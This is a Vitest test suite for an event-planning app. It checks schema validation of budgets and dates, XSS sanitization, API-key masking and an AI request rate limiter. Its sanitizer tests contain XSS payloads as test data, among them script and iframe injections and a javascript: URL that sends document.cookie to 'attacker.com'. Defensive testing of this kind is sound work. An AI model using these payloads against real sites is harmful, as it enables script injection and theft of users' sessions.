import { describe, it, expect } from 'vitest';
import {
  sanitizeText,
  sanitizeInput,
  sanitizeObject,
  aiRateLimiter,
  maskApiKey,
} from '../utils/security';
import {
  eventDataSchema,
  budgetItemSchema,
  vendorSchema,
  macroTaskSchema,
  paymentMilestoneSchema,
} from '../schemas/eventSchemas';

describe('Security Suite, XSS Sanitization & Zod Schemas', () => {
  describe('Zod Schema Rejection of Negative Budgets', () => {
    it('rejects negative target budget in eventDataSchema', () => {
      const invalidEvent = {
        id: 'evt-test',
        name: 'Grand Gala',
        type: 'wedding',
        date: '2026-11-14',
        city: 'Udaipur',
        setting: 'indoor',
        guestCount: 150,
        targetBudget: -500000, // Negative budget
        currency: 'INR',
        culturalPreferences: 'Royal',
        subEvents: [],
      };

      const result = eventDataSchema.safeParse(invalidEvent);
      expect(result.success).toBe(false);
    });

    it('rejects negative allocated amounts in budgetItemSchema', () => {
      const invalidBudgetItem = {
        id: 'bi-1',
        category: 'venue',
        name: 'Palace Hall',
        allocated: -10000, // Negative allocated
        vendorQuote: 50000,
        actualContracted: 40000,
        amountPaid: 10000,
        isLocked: false,
      };

      const result = budgetItemSchema.safeParse(invalidBudgetItem);
      expect(result.success).toBe(false);
    });

    it('rejects negative prices in vendorSchema and paymentMilestoneSchema', () => {
      const invalidVendor = {
        id: 'v-1',
        name: 'Catering Co',
        category: 'catering',
        status: 'shortlisted',
        estimatedPrice: -25000, // Negative
        contractedPrice: 0,
        paidAmount: 0,
        contactName: 'Chef',
        phone: '123',
        email: 'chef@cater.com',
        rating: 4.5,
        ratingCount: 10,
        location: 'City',
        notes: '',
        deliverables: [],
      };
      expect(vendorSchema.safeParse(invalidVendor).success).toBe(false);

      const invalidMilestone = {
        id: 'm-1',
        title: 'Advance',
        amount: -1000, // Negative
        dueDate: '2026-11-14',
        status: 'pending',
        vendorName: 'Venue Co',
        category: 'venue',
      };
      expect(paymentMilestoneSchema.safeParse(invalidMilestone).success).toBe(false);
    });
  });

  describe('Zod Schema Rejection of Invalid Dates', () => {
    it('rejects non-ISO, malformed, or invalid calendar dates in eventDataSchema', () => {
      const base = {
        id: 'evt-1',
        name: 'Concert',
        type: 'community',
        city: 'Mumbai',
        setting: 'outdoor',
        guestCount: 200,
        targetBudget: 100000,
        currency: 'INR',
        culturalPreferences: 'Modern',
        subEvents: [],
      };

      expect(eventDataSchema.safeParse({ ...base, date: 'not-a-date' }).success).toBe(false);
      expect(eventDataSchema.safeParse({ ...base, date: '2026/11/14' }).success).toBe(false);
      expect(eventDataSchema.safeParse({ ...base, date: '14-11-2026' }).success).toBe(false);
      expect(eventDataSchema.safeParse({ ...base, date: '2026-11-14' }).success).toBe(true);
    });

    it('rejects invalid dates in macroTaskSchema and paymentMilestoneSchema', () => {
      const invalidTask = {
        id: 't-1',
        horizon: '1_week',
        title: 'Final Headcount',
        category: 'Catering',
        priority: 'high',
        assignee: 'Planner',
        dueDate: 'next-friday', // Invalid format
        completed: false,
      };
      expect(macroTaskSchema.safeParse(invalidTask).success).toBe(false);

      const validTask = { ...invalidTask, dueDate: '2026-11-20' };
      expect(macroTaskSchema.safeParse(validTask).success).toBe(true);
    });
  });

  describe('XSS Payload Stripping & Input Sanitization', () => {
    it('strips dangerous <script>alert("xss")</script> and <iframe> tags using sanitizeText', () => {
      const malicious = '<script>alert("xss")</script>The Grand Ballroom<iframe src="evil.com"></iframe>';
      const sanitized = sanitizeText(malicious);

      expect(sanitized).toBe('The Grand Ballroom');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).not.toContain('<iframe>');
    });

    it('strips inline event handler attributes (onerror, onclick, onload)', () => {
      const dirty = '<img src="invalid.jpg" onerror="alert(\'xss\')" />VIP Banquet Table';
      const clean = sanitizeInput(dirty);

      expect(clean).toBe('VIP Banquet Table');
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('alert');
    });

    it('strips javascript: pseudo-protocol vectors', () => {
      const payload = 'javascript:fetch("https://attacker.com?c="+document.cookie)';
      const sanitized = sanitizeInput(payload);

      expect(sanitized).not.toContain('javascript:');
    });

    it('deeply sanitizes nested objects and arrays with sanitizeObject', () => {
      const nested = {
        title: '<script>alert(1)</script>Clean Header',
        metadata: {
          note: '<iframe src="x"></iframe>Important Details',
        },
        tags: ['<b>Bold</b>', '<script>alert(2)</script>Tag2'],
      };

      const clean = sanitizeObject(nested);
      expect(clean.title).toBe('Clean Header');
      expect(clean.metadata.note).toBe('Important Details');
      expect(clean.tags[0]).toBe('Bold');
      expect(clean.tags[1]).toBe('Tag2');
    });

    it('automatically sanitizes string fields when parsing through Zod schemas', () => {
      const raw = {
        id: 'evt-xss',
        name: '<script>alert("xss")</script>Udaipur Royal Wedding',
        type: 'wedding',
        date: '2026-11-14',
        city: 'Udaipur<iframe src="evil.com"></iframe>',
        setting: 'hybrid',
        guestCount: 250,
        targetBudget: 1850000,
        currency: 'INR',
        culturalPreferences: '<b>Heritage</b>',
        subEvents: [],
      };

      const parsed = eventDataSchema.parse(raw);
      expect(parsed.name).toBe('Udaipur Royal Wedding');
      expect(parsed.city).toBe('Udaipur');
      expect(parsed.culturalPreferences).toBe('Heritage');
    });
  });

  describe('API Key Masking & AI Rate Limiter', () => {
    it('masks secret API keys to prevent exposure in DOM or exports', () => {
      expect(maskApiKey('AIzaSyAbcdef1234567890xyz')).toBe('AIza••••••••xyz');
      expect(maskApiKey(undefined)).toBe('Not Configured');
    });

    it('strictly enforces rate limit of maximum 10 requests per minute', () => {
      aiRateLimiter.reset();

      for (let i = 0; i < 10; i++) {
        expect(aiRateLimiter.checkRateLimit().allowed).toBe(true);
      }

      // 11th request is blocked
      const blocked = aiRateLimiter.checkRateLimit();
      expect(blocked.allowed).toBe(false);
      expect(blocked.retryAfterMs).toBeGreaterThan(0);

      aiRateLimiter.reset();
    });
  });
});
